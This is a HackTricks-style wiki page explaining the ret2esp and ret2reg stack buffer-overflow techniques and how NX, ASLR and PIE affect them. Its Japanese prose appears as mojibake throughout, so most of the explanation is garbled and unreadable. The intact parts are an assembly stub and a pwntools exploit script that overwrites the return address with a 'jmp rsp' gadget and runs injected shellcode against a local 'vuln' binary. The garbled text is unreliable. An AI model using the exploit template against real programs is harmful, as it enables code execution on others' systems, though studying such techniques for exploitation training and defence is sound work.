# Ret2esp / Ret2reg

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Ret2esp**

**ESPï¼ˆã‚¹ã‚¿ãƒƒã‚¯ãƒã‚¤ãƒ³ã‚¿ï¼‰ãŒå¸¸ã«ã‚¹ã‚¿ãƒƒã‚¯ã®æœ€ä¸Šéƒ¨ã‚’æŒ‡ã—ã¦ã„ã‚‹ãŸã‚**ã€ã“ã®æŠ€è¡“ã¯EIPï¼ˆå‘½ä»¤ãƒã‚¤ãƒ³ã‚¿ï¼‰ã‚’**`jmp esp`**ã¾ãŸã¯**`call esp`**å‘½ä»¤ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ç½®ãæ›ãˆã‚‹ã“ã¨ã‚’å«ã¿ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã¯ä¸Šæ›¸ãã•ã‚ŒãŸEIPã®ç›´å¾Œã«é…ç½®ã•ã‚Œã¾ã™ã€‚`ret`å‘½ä»¤ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã¨ã€ESPã¯æ¬¡ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒ‡ã—ã€æ­£ç¢ºã«ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ãŒæ ¼ç´ã•ã‚Œã¦ã„ã‚‹å ´æ‰€ã«ãªã‚Šã¾ã™ã€‚

**ã‚¢ãƒ‰ãƒ¬ã‚¹ç©ºé–“é…ç½®ã®ãƒ©ãƒ³ãƒ€ãƒ åŒ–ï¼ˆASLRï¼‰**ãŒWindowsã¾ãŸã¯Linuxã§æœ‰åŠ¹ã§ãªã„å ´åˆã€å…±æœ‰ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã«è¦‹ã¤ã‹ã‚‹`jmp esp`ã¾ãŸã¯`call esp`å‘½ä»¤ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã—ã‹ã—ã€[**ASLR**](../common-binary-protections-and-bypasses/aslr/)ãŒæœ‰åŠ¹ãªå ´åˆã€ã“ã‚Œã‚‰ã®å‘½ä»¤ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«è„†å¼±ãªãƒ—ãƒ­ã‚°ãƒ©ãƒ è‡ªä½“ã‚’èª¿ã¹ã‚‹å¿…è¦ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼ˆãã—ã¦ã€[**PIE**](../common-binary-protections-and-bypasses/pie/)ã‚’å›é¿ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼‰ã€‚

ã•ã‚‰ã«ã€EIPã®ç ´æã®**å¾Œã«ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’é…ç½®ã§ãã‚‹**ã“ã¨ã¯ã€é–¢æ•°ã®æ“ä½œä¸­ã«å®Ÿè¡Œã•ã‚Œã‚‹`push`ã¾ãŸã¯`pop`å‘½ä»¤ãŒã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã«å¹²æ¸‰ã—ãªã„ã“ã¨ã‚’ä¿è¨¼ã—ã¾ã™ã€‚ã“ã®å¹²æ¸‰ã¯ã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ãŒé–¢æ•°ã®ã‚¹ã‚¿ãƒƒã‚¯ã®ä¸­é–“ã«é…ç½®ã•ã‚ŒãŸå ´åˆã«ç™ºç”Ÿã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### ã‚¹ãƒšãƒ¼ã‚¹ä¸è¶³

RIPã‚’ä¸Šæ›¸ãã—ãŸå¾Œã«æ›¸ãè¾¼ã‚€ã‚¹ãƒšãƒ¼ã‚¹ãŒä¸è¶³ã—ã¦ã„ã‚‹å ´åˆï¼ˆãŠãã‚‰ãæ•°ãƒã‚¤ãƒˆã ã‘ï¼‰ã€æ¬¡ã®ã‚ˆã†ãªåˆæœŸã®`jmp`ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’æ›¸ãã¾ã™:
```armasm
sub rsp, 0x30
jmp rsp
```
ã‚¹ã‚¿ãƒƒã‚¯ã®æ—©ã„æ®µéšã«ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’æ›¸ãã¾ã™ã€‚

### ä¾‹

ã“ã®æŠ€è¡“ã®ä¾‹ã¯ã€[https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp) ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã€æœ€çµ‚çš„ãªã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = b'A' * 120
payload += p64(jmp_rsp)
payload += asm('''
sub rsp, 10;
jmp rsp;
''')

pause()
p.sendlineafter('RSP!\n', payload)
p.interactive()
```
## Ret2reg

åŒæ§˜ã«ã€é–¢æ•°ãŒã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ãŒæ ¼ç´ã•ã‚Œã¦ã„ã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è¿”ã™ã“ã¨ãŒã‚ã‹ã£ã¦ã„ã‚‹å ´åˆã€**`call eax`** ã¾ãŸã¯ **`jmp eax`** å‘½ä»¤ï¼ˆ**ret2eax** ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¨ã—ã¦çŸ¥ã‚‰ã‚Œã‚‹ï¼‰ã‚’åˆ©ç”¨ã—ã¦ã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹åˆ¥ã®æ–¹æ³•ã‚’æä¾›ã§ãã¾ã™ã€‚eaxã¨åŒæ§˜ã«ã€**èˆˆå‘³æ·±ã„ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å«ã‚€ä»–ã®ãƒ¬ã‚¸ã‚¹ã‚¿**ã‚‚ä½¿ç”¨ã§ãã¾ã™ï¼ˆ**ret2reg**ï¼‰ã€‚

### Example

You can find an example here: [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg)

## Protections

* [**NX**](../common-binary-protections-and-bypasses/no-exec-nx.md): ã‚¹ã‚¿ãƒƒã‚¯ãŒå®Ÿè¡Œå¯èƒ½ã§ãªã„å ´åˆã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’ã‚¹ã‚¿ãƒƒã‚¯ã«é…ç½®ã—ã¦å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã‚¸ãƒ£ãƒ³ãƒ—ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ãŸã‚ã€ã“ã‚Œã¯å½¹ã«ç«‹ã¡ã¾ã›ã‚“ã€‚
* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) & [**PIE**](../common-binary-protections-and-bypasses/pie/): ã“ã‚Œã‚‰ã¯ã€espã‚„ä»–ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã«ã‚¸ãƒ£ãƒ³ãƒ—ã™ã‚‹å‘½ä»¤ã‚’è¦‹ã¤ã‘ã‚‹ã®ã‚’é›£ã—ãã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

## References

* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode)
* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
